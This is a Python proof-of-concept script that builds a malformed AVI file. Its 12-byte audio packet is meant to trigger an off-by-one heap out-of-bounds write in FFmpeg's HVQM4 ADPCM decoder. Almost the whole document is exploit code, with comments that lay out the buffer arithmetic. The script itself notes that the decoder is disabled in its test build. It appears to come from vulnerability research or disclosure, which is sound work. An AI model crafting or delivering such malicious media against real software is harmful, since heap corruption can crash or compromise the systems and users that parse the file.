#!/usr/bin/env python3
"""
PoC generator for VULN 001: decode_adpcm_ima_hvqm4 mono off-by-one heap OOB write
CWE-122: Heap-based Buffer Overflow

Crafts a minimal AVI file with a mono ADPCM_IMA_HVQM4 audio stream.
The malicious packet sets frame_format=1 and has length > 8 bytes,
causing an off-by-one heap OOB write in decode_adpcm_ima_hvqm4().

Vulnerability details:
- get_nb_samples() for mono ff=1: skip=8, nb_samples=(buf_size-8)*2
- ff_get_buffer allocates N=nb_samples int16_t values
- decode_adpcm_ima_hvqm4 writes N+1 values: 1 predictor + N samples (loop runs N/2 times x2)
- Result: 2-byte heap OOB write past the allocated buffer

Note: CONFIG_ADPCM_IMA_HVQM4_DECODER=0 in the test build, so this PoC
documents the correct file structure but cannot trigger the bug at runtime
with the available binary.
"""

import struct
import os

OUT_DIR = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_001_input.avi")

# HVQM4 does not have a registered WAVE format tag in FFmpeg's riff.c table.
# We use 0x4800 as a placeholder tag for the AVI strf chunk.
# In a fully-enabled build, one would need either a registered WAVE tag or a
# dedicated container demuxer for HVQM4 content.
WAVE_FORMAT_HVQM4 = 0x4800

CHANNELS = 1          # mono
SAMPLE_RATE = 22050
BITS_PER_SAMPLE = 16
BLOCK_ALIGN = 13      # arbitrary

# Malicious audio packet construction for frame_format=1, mono:
#   Bytes 0-1:  frame_format = 0x0001 (big-endian)
#   Bytes 2-5:  4 bytes (skipped by the CASE handler: bytestream2_skip(&gb, 4))
#   Bytes 6-7:  predictor+step_index header (case 1: bytestream2_get_be16)
#   Bytes 8-N:  ADPCM nibble data
#
# nb_samples calculation: (buf_size - skip) * 2 / ch
#   skip = 6 + 2*ch = 6 + 2*1 = 8   (for frame_format=1, mono)
#   nb_samples = (buf_size - 8) * 2
#
# For buf_size=12: nb_samples = (12-8)*2 = 8
#   Allocates 8 * sizeof(int16_t) = 16 bytes
#   decode_adpcm_ima_hvqm4 writes:
#     1 predictor sample  (outbuf[0])
#     loop: i=0,2,4,6 (4 iters, stride=2), 2 writes/iter = 8 writes
#     total = 9 writes into buffer of 8 → outbuf[8] is 2-byte OOB write

FRAME_FORMAT = 1

# Build the malicious audio packet (12 bytes)
packet = bytearray()
packet += struct.pack('>H', FRAME_FORMAT)        # bytes 0-1: frame_format = 1 (big-endian)
packet += struct.pack('<I', 0x00000000)           # bytes 2-5: 4 bytes skipped by CASE handler
packet += struct.pack('>H', 0x0000)              # bytes 6-7: predictor=0, step_index=0 (case 1 header)
packet += bytes([0x00, 0x00, 0x00, 0x00])        # bytes 8-11: ADPCM nibble data (4 bytes)
# Total: 12 bytes
# nb_samples = (12 - 8) * 2 = 8, buffer = 16 bytes, writes = 9 * 2 = 18 bytes → 2-byte OOB

assert len(packet) == 12, f"Expected 12 bytes, got {len(packet)}"

def make_chunk(fourcc, data):
    """Build a RIFF chunk: 4-byte FourCC + 4-byte size (LE) + data (padded to even)."""
    assert len(fourcc) == 4
    chunk = fourcc.encode('ascii') + struct.pack('<I', len(data)) + bytes(data)
    if len(data) % 2 == 1:
        chunk += b'\x00'
    return chunk

def make_list(fourcc, data):
    """Build a RIFF LIST chunk."""
    assert len(fourcc) == 4
    return b'LIST' + struct.pack('<I', 4 + len(data)) + fourcc.encode('ascii') + bytes(data)

# --- WAVEFORMATEX for strf chunk ---
# WAVEFORMATEX structure (18 bytes minimum):
#   wFormatTag      (2)
#   nChannels       (2)
#   nSamplesPerSec  (4)
#   nAvgBytesPerSec (4)
#   nBlockAlign     (2)
#   wBitsPerSample  (2)
#   cbSize          (2)
strf_data = struct.pack('<HHIIHH',
    WAVE_FORMAT_HVQM4,                             # wFormatTag
    CHANNELS,                                       # nChannels
    SAMPLE_RATE,                                    # nSamplesPerSec
    SAMPLE_RATE * CHANNELS * BITS_PER_SAMPLE // 8, # nAvgBytesPerSec
    BLOCK_ALIGN,                                    # nBlockAlign
    BITS_PER_SAMPLE,                                # wBitsPerSample
) + struct.pack('<H', 0)                            # cbSize = 0

# --- Stream header (strh) for audio ---
# AVISTREAMHEADER:
#   fccType         (4): 'auds'
#   fccHandler      (4): codec tag (same as wFormatTag, 0-padded to 4 bytes)
#   dwFlags         (4)
#   wPriority       (2)
#   wLanguage       (2)
#   dwInitialFrames (4)
#   dwScale         (4): 1
#   dwRate          (4): sample_rate
#   dwStart         (4): 0
#   dwLength        (4): nb_samples (set to 8 for our packet)
#   dwSuggestedBufferSize (4)
#   dwQuality       (4): -1
#   dwSampleSize    (4): 2 (16-bit)
#   rcFrame         (8 * 2): left, top, right, bottom
fcc_handler = struct.pack('<I', WAVE_FORMAT_HVQM4) # store as 4-byte LE
strh_data = (
    b'auds' +
    fcc_handler +
    struct.pack('<IHH', 0, 0, 0) +   # dwFlags, wPriority, wLanguage
    struct.pack('<IIIIII',
        0,                            # dwInitialFrames
        1,                            # dwScale
        SAMPLE_RATE,                  # dwRate
        0,                            # dwStart
        8,                            # dwLength (8 samples)
        len(packet) * 2,              # dwSuggestedBufferSize
    ) +
    struct.pack('<i', -1) +           # dwQuality
    struct.pack('<I', CHANNELS * 2) + # dwSampleSize (16-bit mono = 2)
    struct.pack('<hhhh', 0, 0, 0, 0)  # rcFrame
)

strh_chunk = make_chunk('strh', strh_data)
strf_chunk = make_chunk('strf', strf_data)
strl_list = make_list('strl', strh_chunk + strf_chunk)

# --- AVI main header (avih) ---
# AVIMAINHEADER:
#   dwMicroSecPerFrame    (4): 1000000 / fps (use 1 fps = 1000000)
#   dwMaxBytesPerSec      (4)
#   dwPaddingGranularity  (4)
#   dwFlags               (4)
#   dwTotalFrames         (4): 1
#   dwInitialFrames       (4): 0
#   dwStreams              (4): 1
#   dwSuggestedBufferSize (4)
#   dwWidth               (4): 0 (audio only)
#   dwHeight              (4): 0 (audio only)
#   dwReserved[4]         (16)
avih_data = struct.pack('<IIIIIIIIIIIIII',
    1000000,    # dwMicroSecPerFrame (1 fps)
    0,          # dwMaxBytesPerSec
    0,          # dwPaddingGranularity
    0x10,       # dwFlags (AVIF_HASINDEX)
    1,          # dwTotalFrames
    0,          # dwInitialFrames
    1,          # dwStreams
    len(packet) * 2,  # dwSuggestedBufferSize
    0,          # dwWidth
    0,          # dwHeight
    0, 0, 0, 0  # dwReserved
)
avih_chunk = make_chunk('avih', avih_data)
hdrl_list = make_list('hdrl', avih_chunk + strl_list)

# --- Audio data packet ---
# In AVI, audio chunks are named '00wb' (stream 0, wave bytes)
audio_chunk = make_chunk('00wb', packet)
movi_list = make_list('movi', audio_chunk)

# --- Index (idx1) ---
# AVIINDEXENTRY:
#   ckid    (4): '00wb'
#   dwFlags (4): AVIIF_KEYFRAME = 0x10
#   dwOffset(4): offset of data from movi start + 4
#   dwSize  (4): size of data
idx1_entry = struct.pack('<4sIII',
    b'00wb',
    0x10,       # AVIIF_KEYFRAME
    4,          # offset from 'movi' list data start (past 'movi' fourcc)
    len(packet)
)
idx1_chunk = make_chunk('idx1', idx1_entry)

# --- Assemble RIFF AVI ---
riff_data = hdrl_list + movi_list + idx1_chunk
riff = b'RIFF' + struct.pack('<I', 4 + len(riff_data)) + b'AVI ' + riff_data

with open(OUT_FILE, 'wb') as f:
    f.write(riff)

print(f"[+] Written: {OUT_FILE} ({len(riff)} bytes)")
print(f"[+] Audio packet: {len(packet)} bytes, frame_format={FRAME_FORMAT}, channels={CHANNELS}")
print(f"[+] Expected nb_samples = (12-8)*2 = 8, buffer = 16 bytes, writes = 9*2 = 18 bytes")
print(f"[+] OOB write: 2 bytes past end of allocated int16_t buffer")
print(f"[!] NOTE: CONFIG_ADPCM_IMA_HVQM4_DECODER=0 in test build → decoder not registered")
print(f"[!] ffmpeg will report 'Decoder adpcm_ima_hvqm4 not found' with the provided binary")
